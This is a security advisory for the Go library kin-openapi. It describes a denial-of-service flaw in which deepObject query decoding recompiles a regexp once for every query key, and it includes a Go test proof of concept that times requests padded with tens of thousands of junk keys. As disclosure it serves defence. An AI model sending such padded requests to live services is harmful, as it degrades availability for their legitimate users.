### Summary

`openapi3filter` decodes `deepObject`-style query parameters by looping over **every** key in the request's query string. Inside that loop it recompiles a **loop-invariant** regular expression on every iteration. The pattern depends only on the spec-defined parameter name, not on the loop variable, so it is compiled `N` times for `N` query keys instead of once. Because the number of query keys is attacker-controlled and unbounded, a single request with many junk query keys forces a proportional number of `regexp.MustCompile` calls, consuming CPU. A handful of concurrent requests can saturate all cores — an uncontrolled-resource-consumption denial of service.

This is **not** ReDoS: the pattern is fixed (`^<param>\[`) and matches in linear time. The cost is the **repeated compilation** of an invariant regexp, once per attacker-supplied query key.

### Details

In `openapi3filter/req_resp_decoder.go`, the `deepObject` branch of `urlValuesDecoder.DecodeObject` builds a per-parameter property map by iterating over all query keys:

```go
case "deepObject":
    propsFn = func(params url.Values) (map[string]string, error) {
        props := make(map[string]string)
        for key, values := range params {                                            // req_resp_decoder.go:689
            if !regexp.MustCompile(fmt.Sprintf(`^%s\[`, regexp.QuoteMeta(param))).MatchString(key) { // :690
                continue
            }
            matches := deepObjectBracketRE.FindAllStringSubmatch(key, -1)
            ...
        }
        ...
    }
```

The regexp built at `req_resp_decoder.go:690` depends only on `param` — the parameter name defined in the OpenAPI spec — which is **constant** for the whole loop. Yet `regexp.MustCompile(...)` is invoked inside the `for key, values := range params` loop at `req_resp_decoder.go:689`, so it is recompiled once for every key present in the query string.

Contrast this with the already-hoisted, package-level regexp used two lines below:

```go
var deepObjectBracketRE = regexp.MustCompile(`\[(.*?)\]`) // req_resp_decoder.go:41
```

`deepObjectBracketRE` is compiled exactly once at package init and reused. The per-parameter pattern at `:690` should be compiled the same way (once, outside the loop), but instead is rebuilt on every iteration.

`regexp.MustCompile` costs on the order of a few microseconds per call. The number of iterations equals the number of query keys `N`, which the client fully controls (a ~1 MB URL holds roughly 100k keys). For each `deepObject` parameter `M` defined on the matched route, the request performs `N × M` compilations. The work is CPU-bound, happens during request validation before any handler logic, and scales linearly with request size, so an attacker converts cheap request bytes into expensive server CPU.

Affected code path: `ValidateRequest` → `ValidateParameter` → `decodeStyledParameter` → `urlValuesDecoder.DecodeObject` (the `deepObject` case). Any operation with at least one `in: query`, `style: deepObject` parameter is exploitable.

### PoC

The following self-contained test (package `openapi3filter_test`) defines a spec with a single `deepObject` query parameter, then validates two requests that differ only in the number of junk query keys. Decoding time grows with the key count even though none of the junk keys are part of the parameter.

Save as `openapi3filter/advisory_poc_test.go`:

```go
package openapi3filter_test

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const specDeepObjectParam = `
openapi: 3.0.0
info: {title: PoC, version: 1.0.0}
paths:
  /f:
    get:
      parameters:
        - name: filter
          in: query
          style: deepObject
          explode: true
          schema: {type: object, properties: {a: {type: string}}}
      responses:
        '200': {description: ok}
`

// TestPoCDeepObjectRegexpCPU demonstrates that decode cost scales with the
// number of (attacker-controlled) junk query keys because a loop-invariant
// regexp is recompiled once per key. It logs timings for two key counts and
// fails if the larger count crosses a clearly-abnormal CPU threshold.
func TestPoCDeepObjectRegexpCPU(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(specDeepObjectParam))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if err := doc.Validate(loader.Context); err != nil {
		t.Fatalf("validate: %v", err)
	}
	router, err := gorillamux.NewRouter(doc)
	if err != nil {
		t.Fatalf("router: %v", err)
	}

	run := func(n int) time.Duration {
		var sb strings.Builder
		sb.WriteString("/f?filter[a]=x")
		for i := 0; i < n; i++ {
			fmt.Fprintf(&sb, "&j%d=1", i)
		}
		req, _ := http.NewRequest(http.MethodGet, sb.String(), nil)
		route, pathParams, err := router.FindRoute(req)
		if err != nil {
			t.Fatalf("route: %v", err)
		}
		start := time.Now()
		_ = openapi3filter.ValidateRequest(context.Background(), &openapi3filter.RequestValidationInput{
			Request: req, PathParams: pathParams, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
		return time.Since(start)
	}

	small := run(2000)
	large := run(40000)
	t.Logf("2000 junk keys -> %v ; 40000 junk keys -> %v (cost scales with key count)", small, large)
	if large > 100*time.Millisecond {
		t.Fatalf("VULNERABLE: 40000 junk keys cost %v of CPU for a single request (regexp recompiled per key); scales to full-core saturation", large)
	}
}
```

Run:

```
go test ./openapi3filter/ -run TestPoCDeepObjectRegexpCPU -v
```

Observed output on the reference machine (Go 1.25, linux/amd64):

```
=== RUN   TestPoCDeepObjectRegexpCPU
    advisory_poc_test.go:71: 2000 junk keys -> 16.542072ms ; 40000 junk keys -> 258.146949ms (cost scales with key count)
    advisory_poc_test.go:73: VULNERABLE: 40000 junk keys cost 258.146949ms of CPU for a single request (regexp recompiled per key); scales to full-core saturation
--- FAIL: TestPoCDeepObjectRegexpCPU (0.28s)
FAIL
FAIL	github.com/getkin/kin-openapi/openapi3filter	0.293s
FAIL
```

Time grows roughly linearly with the key count (20× more keys → ~15× more time), and none of the `j<i>=1` keys belong to the `filter` parameter — they are pure junk whose only effect is to add loop iterations, each of which recompiles the invariant regexp. A ~1 MB URL (~100k keys) pushes a single request into the ~0.6 s range per `deepObject` parameter; a few concurrent such requests saturate every core.

### Impact

Uncontrolled CPU consumption (denial of service). Any service that uses `openapi3filter.ValidateRequest` (directly or via a router) to validate requests against a spec containing at least one `in: query`, `style: deepObject` parameter is affected. An unauthenticated attacker who can reach such an endpoint can send requests with large numbers of junk query keys; each request performs a number of `regexp.MustCompile` calls proportional to the request's query-key count times the number of `deepObject` parameters on the route. Because the work is CPU-bound and executed during validation (before any application handler runs), modest request rates can starve the process of CPU and degrade or deny service to legitimate clients. There is no impact to confidentiality or integrity.

The fix is to hoist the invariant regexp out of the loop — compile it once per parameter (or at package level, as `deepObjectBracketRE` at `req_resp_decoder.go:41` already is) and reuse it across all keys.

---

- Ecosystem: Go
- Package: github.com/getkin/kin-openapi
- Affected versions: all released versions up to and including v0.145.0 (present since `deepObject` object decoding was introduced).
- CVSS v3.1: 5.3 (Medium) — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L
- CWE: CWE-400 (Uncontrolled Resource Consumption); also CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-1050 (Excessive Platform Resource Consumption within a Loop).
- Advisory relationship: Novel. Adjacent to a previously reported memory-exhaustion issue in `deepObject` decoding (via `sliceMapToSlice`), but this is a distinct CPU-exhaustion mechanism — repeated compilation of a loop-invariant regexp, once per attacker-supplied query key — not covered by that earlier memory-focused advisory.
